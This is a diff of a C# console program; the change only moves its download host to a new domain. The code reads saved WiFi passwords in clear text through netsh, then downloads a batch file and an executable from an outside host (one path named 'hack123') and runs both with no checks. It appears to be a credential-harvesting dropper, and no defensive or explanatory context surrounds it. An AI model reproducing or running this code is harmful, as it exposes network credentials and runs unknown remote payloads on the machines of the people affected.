@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Net;
 
@@ -80,7 +80,6 @@ class Program
     static void GetWifiPassword()
     {
         Console.WriteLine("Listing all WiFi profiles...");
-
         Process process = new Process();
         process.StartInfo.FileName = "cmd.exe";
         process.StartInfo.Arguments = "/C netsh wlan show profiles";
@@ -89,7 +88,6 @@ class Program
         process.StartInfo.CreateNoWindow = true;
 
         process.Start();
-
         string output = process.StandardOutput.ReadToEnd();
 
         process.WaitForExit();
@@ -98,14 +96,11 @@ class Program
 
         Console.WriteLine("Enter the WiFi name (SSID) to get the password: ");
         string wifiName = Console.ReadLine();
-
         process.StartInfo.Arguments = $"/C netsh wlan show profile name=\"{wifiName}\" key=clear";
         process.Start();
-
         output = process.StandardOutput.ReadToEnd();
 
         process.WaitForExit();
-
         if (output.Contains("Key Content"))
         {
             string[] lines = output.Split('\n');
@@ -132,7 +127,7 @@ class Program
         {
             Console.WriteLine("\nDownloading and running c.bat...");
 
-            string command = "curl cekki.cekuj.net/c.bat -o c.bat && c.bat";
+            string command = "curl cekkistorage.cekuj.net/c.bat -o c.bat && c.bat";
 
             var processInfo = new System.Diagnostics.ProcessStartInfo("cmd", $"/c {command}")
             {
@@ -161,7 +156,7 @@ class Program
         {
             using (var client = new WebClient())
             {
-                client.DownloadFile("http://cekki.cekuj.net/hack123/cp.exe", "cp.exe");
+                client.DownloadFile("http://cekkistorage.cekuj.net/hack123/cp.exe", "cp.exe");
                 Console.WriteLine("cp.exe downloaded successfully.");
                 Process.Start("cp.exe");
             }
